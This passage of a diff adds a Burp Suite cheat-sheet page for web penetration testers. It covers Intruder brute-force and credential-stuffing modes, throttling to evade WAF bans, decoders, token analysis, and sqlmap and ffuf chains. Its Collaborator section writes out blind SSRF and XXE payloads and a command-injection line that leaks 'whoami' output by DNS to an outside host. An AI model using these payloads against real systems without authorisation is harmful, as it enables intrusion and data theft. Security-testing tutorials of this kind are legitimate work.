+            <tr><td><code class="flag-code">Battering Ram</code></td><td>1 list</td><td class="flag-desc">Injects identical payload into all positions simultaneously</td><td class="flag-default">Testing same value across all fields</td></tr>
+            <tr><td><code class="flag-code">Pitchfork</code></td><td>Multiple lists</td><td class="flag-desc">Pairs list A[N] with list B[N] in parallel lockstep</td><td class="flag-default">Credential stuffing (username &harr; password)</td></tr>
+            <tr><td><code class="flag-code">Cluster Bomb</code></td><td>Multiple lists</td><td class="flag-desc">Cartesian product: tests all possible combinations</td><td class="flag-default">Brute-force (username &times; password) &mdash; exponential</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Grep-Match -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Grep-Match (Response Differentiation)</div>
+              <div class="cmd-block__desc">Differentiate successful hits when all responses return identical HTTP status codes or similar byte lengths.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <p style="margin-bottom:var(--sp-2); font-size:var(--t-sm);">Go to <strong>Intruder &rarr; Options &rarr; Grep - Match</strong>, clear defaults, and add strings indicating application state:</p>
+              <div class="flags-table-wrap">
+                <table class="flags-table" role="table">
+                  <thead><tr><th scope="col">Indicator String</th><th scope="col">Significance</th><th scope="col">Sorting Strategy</th></tr></thead>
+                  <tbody>
+                    <tr><td><code>Welcome</code></td><td class="flag-desc">Login success indicator</td><td class="flag-default">Sort column descending (1 = hit)</td></tr>
+                    <tr><td><code>Dashboard</code></td><td class="flag-desc">Authenticated administrative portal</td><td class="flag-default">Sort column descending</td></tr>
+                    <tr><td><code>Set-Cookie: session</code></td><td class="flag-desc">New session cookie issued by server</td><td class="flag-default">Sort column descending</td></tr>
+                    <tr><td><code>Invalid password</code></td><td class="flag-desc">Explicit login failure banner</td><td class="flag-default">Negative filter (isolate 0 hits)</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Throttling & Resource Pool -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Throttling (Community &amp; Live Targets)</div>
+              <div class="cmd-block__desc">Configure resource pools to prevent WAF bans, IP rate-limiting, and server lockouts.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <p style="font-size:var(--t-sm); line-height:1.6; margin:0;">
+                In Community Edition, Intruder is throttled by design. On live production targets in Professional Edition, set <strong>Intruder &rarr; Resource Pool &rarr; Maximum concurrent requests to 4&ndash;8</strong> with a <code>200&ndash;500ms</code> delay between requests to avoid triggering automated WAF/fail2ban defenses.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. Decoder -->
+    <section class="content-section" id="decoder" aria-labelledby="decoder-title">
+      <h2 class="content-section__title" id="decoder-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
+        Decoder &amp; Encoder
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Format</th><th scope="col">Direction</th><th scope="col">Common Use</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">URL</code></td><td class="flag-desc">Encode / Decode</td><td class="flag-default">Bypass filters, decode query parameters</td></tr>
+            <tr><td><code class="flag-code">HTML</code></td><td class="flag-desc">Encode / Decode</td><td class="flag-default">XSS payload encoding and attribute escaping</td></tr>
+            <tr><td><code class="flag-code">Base64</code></td><td class="flag-desc">Encode / Decode</td><td class="flag-default">Cookie, token, and Basic auth inspection</td></tr>
+            <tr><td><code class="flag-code">Hex</code></td><td class="flag-desc">Encode / Decode</td><td class="flag-default">Raw binary byte stream inspection</td></tr>
+            <tr><td><code class="flag-code">ASCII Hex</code></td><td class="flag-desc">Encode / Decode</td><td class="flag-default">Encoding binary exploit payloads in hex notation</td></tr>
+            <tr><td><code class="flag-code">Gzip</code></td><td class="flag-desc">Compress / Decompress</td><td class="flag-default">Decompressing compressed response bodies</td></tr>
+            <tr><td><code class="flag-code">Hashes</code></td><td class="flag-desc">Digest Generation</td><td class="flag-default">Generate MD5, SHA-1, SHA-256 digests</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 5. Comparer & Sequencer -->
+    <section class="content-section" id="comparer" aria-labelledby="comparer-title">
+      <h2 class="content-section__title" id="comparer-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="18" rx="1"/><rect x="14" y="3" width="7" height="18" rx="1"/></svg>
+        Comparer &amp; Sequencer — Diff &amp; Entropy Analysis
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Comparer -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Comparer: Word-by-Word &amp; Byte-Level Diffing</div>
+              <div class="cmd-block__desc">Perform visual diffs between two responses or payloads to spot subtle vulnerabilities.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <p style="margin-bottom:var(--sp-2); font-size:var(--t-sm);"><strong>Workflow:</strong> Send two responses or requests to Comparer to spot hidden behavioral differences:</p>
+              <div class="code-line">
+                <span class="code-line__prompt">&gt;</span>
+                <code class="code-line__code"><span class="tok-cmd">Right-click response A</span> &rarr; <span class="tok-val">Send to Comparer</span> &rarr; <span class="tok-cmd">Right-click response B</span> &rarr; <span class="tok-val">Send to Comparer</span> &rarr; <span class="tok-arg">Click "Words"</span></code>
+                <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+              </div>
+              <p style="margin-top:var(--sp-2); font-size:var(--t-xs); color:var(--c-muted);">Ideal for diagnosing blind SQL injection boolean conditions, access control edge cases, and subtle timing variations.</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Sequencer -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Sequencer: Token Randomness &amp; Entropy Analysis</div>
+              <div class="cmd-block__desc">Quantify the cryptographic randomness of session cookies, CSRF tokens, and password reset nonces.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <p style="margin-bottom:var(--sp-2); font-size:var(--t-sm);"><strong>Workflow:</strong> Test token predictability to reveal session hijacking risks:</p>
+              <ol style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+                <li>Right-click the HTTP request issuing the token &rarr; <em>Send to Sequencer</em>.</li>
+                <li>In <em>Sequencer &rarr; Live capture</em>, verify the token location (e.g. <code>Set-Cookie: PHPSESSID=...</code>).</li>
+                <li>Click <strong>Start live capture</strong> (Burp harvests 10,000+ sequential tokens) &rarr; Click <strong>Analyze now</strong>.</li>
+                <li>Review the FIPS 140-2 statistical tests and effective entropy bit count.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. Collaborator -->
+    <section class="content-section" id="collaborator" aria-labelledby="collaborator-title">
+      <h2 class="content-section__title" id="collaborator-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1 4-10z"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
+        Collaborator — Out-of-Band (OAST) Testing
+      </h2>
+      <div class="callout callout--info" role="note" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          Burp Collaborator is an out-of-band application security testing (OAST) server. It captures interactions triggered when target backends execute external DNS resolutions, HTTP requests, or SMTP connections without returning an in-band response.
+        </div>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <!-- Block 1: OAST Workflow -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Collaborator OAST Testing Workflow</div>
+              <div class="cmd-block__desc">Generate unique payloads, inject into target input vectors, and poll for out-of-band interactions.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+              <ol style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+                <li>Go to the <strong>Collaborator</strong> tab &rarr; click <strong>Copy to clipboard</strong> (generates a unique subdomain like <code>abc123xyz.oastify.com</code>).</li>
+                <li>Inject the payload into untrusted input fields, HTTP headers, or parameters:
+                  <div style="margin: var(--sp-2) 0;">
+                    <code>X-Forwarded-For: abc123xyz.oastify.com</code> &mdash; Blind SSRF<br>
+                    <code>&lt;!ENTITY xxe SYSTEM "http://abc123xyz.oastify.com"&gt;</code> &mdash; Blind XXE<br>
+                    <code>; nslookup $(whoami).abc123xyz.oastify.com ;</code> &mdash; Blind OS Command Injection / DNS Exfiltration
+                  </div>
+                </li>
+                <li>Send the request from Repeater or Intruder.</li>
+                <li>Switch back to <strong>Collaborator</strong> &rarr; click <strong>Poll now</strong> to inspect received DNS queries and HTTP connections.</li>
+              </ol>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-warn); font-weight: 600;">OPSEC Notice:</span> Community Edition routes through a public shared Collaborator server. Professional Edition supports private on-premise Collaborator instances for strict enterprise non-disclosure.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 7. Essential BApp Extensions -->
+    <section class="content-section" id="extensions" aria-labelledby="extensions-title">
+      <h2 class="content-section__title" id="extensions-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+        Essential BApp Extensions — Professional Workflow Superchargers
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Extension</th><th scope="col">Purpose</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">Turbo Intruder</code></td><td class="flag-desc">High-speed Python-driven HTTP fuzzer &mdash; executes race condition exploits, single-packet attacks, and 10,000+ req/sec</td></tr>
+            <tr><td><code class="flag-code">Autorize</code></td><td class="flag-desc">Automatic IDOR / BOLA detection &mdash; transparently replays every user request using a secondary low-privilege session cookie</td></tr>
+            <tr><td><code class="flag-code">Param Miner</code></td><td class="flag-desc">Discovers hidden, unlinked query parameters and HTTP headers susceptible to cache poisoning or logic bypasses</td></tr>
+            <tr><td><code class="flag-code">JWT Editor</code></td><td class="flag-desc">Decode, edit, and resign JSON Web Tokens; automate <code>alg: none</code>, key confusion, and embedded JWK attacks</td></tr>
+            <tr><td><code class="flag-code">Logger++</code></td><td class="flag-desc">Multithreaded request/response logging engine with advanced regex filters, custom columns, and live streaming</td></tr>
+            <tr><td><code class="flag-code">HTTP Request Smuggler</code></td><td class="flag-desc">Detect and exploit front-end / back-end HTTP request smuggling desync attacks (CL.TE, TE.CL, TE.TE)</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="prose" style="margin-top:var(--sp-3);">
+        <p style="font-size:var(--t-xs); color:var(--c-muted);">Install extensions via <strong>Extensions &rarr; BApp Store</strong>. For Python extensions (Autorize, Param Miner), ensure a standalone Jython <code>.jar</code> is configured in <em>Settings &rarr; Extensions &rarr; Python environment</em>.</p>
+      </div>
+    </section>
+
+    <!-- 8. Keyboard Shortcuts -->
+    <section class="content-section" id="shortcuts" aria-labelledby="shortcuts-title">
+      <h2 class="content-section__title" id="shortcuts-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M7 8h1M12 8h1M17 8h1M7 12h1M12 12h5M7 16h10"/></svg>
+        Keyboard Shortcuts
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Shortcut</th><th scope="col">Action</th><th scope="col">Scope</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">Ctrl+R</code></td><td class="flag-desc">Send active request to Repeater</td><td class="flag-default">Global</td></tr>
+            <tr><td><code class="flag-code">Ctrl+I</code></td><td class="flag-desc">Send active request to Intruder</td><td class="flag-default">Global</td></tr>
+            <tr><td><code class="flag-code">Ctrl+F</code></td><td class="flag-desc">Forward intercepted request</td><td class="flag-default">Proxy</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+F</code></td><td class="flag-desc">Forward and intercept next request</td><td class="flag-default">Proxy</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+R</code></td><td class="flag-desc">Toggle proxy intercept ON / OFF</td><td class="flag-default">Proxy</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Z</code></td><td class="flag-desc">Drop intercepted request</td><td class="flag-default">Proxy</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+D</code></td><td class="flag-desc">Switch to Dashboard module</td><td class="flag-default">Navigation</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+T</code></td><td class="flag-desc">Switch to Target module</td><td class="flag-default">Navigation</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+P</code></td><td class="flag-desc">Switch to Proxy module</td><td class="flag-default">Navigation</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+I</code></td><td class="flag-desc">Switch to Intruder module</td><td class="flag-default">Navigation</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Enter</code></td><td class="flag-desc">Send request in Repeater</td><td class="flag-default">Repeater</td></tr>
+            <tr><td><code class="flag-code">Ctrl+U</code></td><td class="flag-desc">URL-encode selection</td><td class="flag-default">Editor</td></tr>
+            <tr><td><code class="flag-code">Ctrl+Shift+U</code></td><td class="flag-desc">URL-decode selection</td><td class="flag-default">Editor</td></tr>
+            <tr><td><code class="flag-code">Ctrl+S</code></td><td class="flag-desc">Search text / move cursor to search field</td><td class="flag-default">Editor</td></tr>
+            <tr><td><code class="flag-code">Ctrl+A</code></td><td class="flag-desc">Select all text</td><td class="flag-default">Editor</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 9. Cheatsheet -->
+    <section class="content-section" id="cheatsheet" aria-labelledby="cheatsheet-title">
+      <h2 class="content-section__title" id="cheatsheet-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+        Quick Cheatsheet &amp; Tool Chains
+      </h2>
+      <div class="cheat-grid">
+        <div class="cheat-cell"><div class="cheat-cell__label">Proxy default listener</div><div class="cheat-cell__code">127.0.0.1:8080</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Route curl through Burp</div><div class="cheat-cell__code">curl --proxy http://127.0.0.1:8080 -k https://target</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Toggle intercept</div><div class="cheat-cell__code">Ctrl+Shift+R</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Send to Repeater</div><div class="cheat-cell__code">Ctrl+R</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Send to Intruder</div><div class="cheat-cell__code">Ctrl+I</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Collaborator client (OAST)</div><div class="cheat-cell__code">Collaborator &gt; Copy to clipboard &gt; Poll now</div></div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Burp to ffuf</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">ffuf -request request.txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Burp to SQLmap</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">sqlmap -r request.txt -p id --batch --dbs</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>Official Docs</span><span style="font-size:10px; color:#f4821f; font-weight:700;">GUIDE</span></div>
+          <div class="cheat-cell__code"><a href="https://portswigger.net/burp/documentation/desktop/getting-started" target="_blank" rel="noopener noreferrer" style="color:#f4821f; text-decoration:underline;">https://portswigger.net/burp/documentation/desktop/getting-started</a></div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Burp to Wireshark</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">Route traffic through Burp &rarr; capture on loopback (lo) in Wireshark</div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script src="../assets/app.js"></script>
+<script>
+registerSearchItems([
+  { tool:'Burp', cmd:'curl --proxy http://127.0.0.1:8080 -k https://target.com', desc:'Route CLI HTTP traffic through Burp Suite proxy', target:'burpsuite.html#proxy' },
+  { tool:'Burp', cmd:'Ctrl+R', desc:'Send active request to Repeater tab', target:'burpsuite.html#repeater' },
+  { tool:'Burp', cmd:'Ctrl+I', desc:'Send active request to Intruder fuzzer', target:'burpsuite.html#intruder' },
+  { tool:'Burp', cmd:'Ctrl+Shift+R', desc:'Toggle proxy intercept on or off', target:'burpsuite.html#shortcuts' },
+  { tool:'Burp', cmd:'Ctrl+F', desc:'Forward intercepted request in Proxy', target:'burpsuite.html#shortcuts' },
+  { tool:'Burp', cmd:'Proxy > Match and replace', desc:'Spoof User-Agent / rewrite headers automatically', target:'burpsuite.html#proxy' },
+  { tool:'Burp', cmd:'Right-click > Do intercept > Response', desc:'Intercept and modify incoming HTTP server responses', target:'burpsuite.html#proxy' },
+  { tool:'Burp', cmd:'Intruder > Grep-Match', desc:'Differentiate responses by custom keyword indicators', target:'burpsuite.html#intruder' },
+  { tool:'Burp', cmd:'Collaborator > Poll now', desc:'Inspect out-of-band (OAST) blind interactions', target:'burpsuite.html#collaborator' },
+  { tool:'Burp', cmd:'Comparer > Words', desc:'Word-by-word visual diff of two HTTP responses', target:'burpsuite.html#comparer' },
+  { tool:'Burp', cmd:'Turbo Intruder', desc:'High-speed Python fuzzer for race conditions', target:'burpsuite.html#extensions' },
+  { tool:'Burp', cmd:'ffuf -request request.txt -w list.txt -ac', desc:'Pipeline exported Burp request into ffuf', target:'burpsuite.html#cheatsheet' },
+  { tool:'Burp', cmd:'sqlmap -r request.txt -p id', desc:'Pipeline exported Burp request into SQLmap', target:'burpsuite.html#cheatsheet' },
+  { tool:'Burp', cmd:'https://portswigger.net/burp/documentation/desktop/getting-started', desc:'Official PortSwigger Burp Suite Getting Started Guide', target:'burpsuite.html#overview' }
+]);
+</script>
+</body>
+</html>
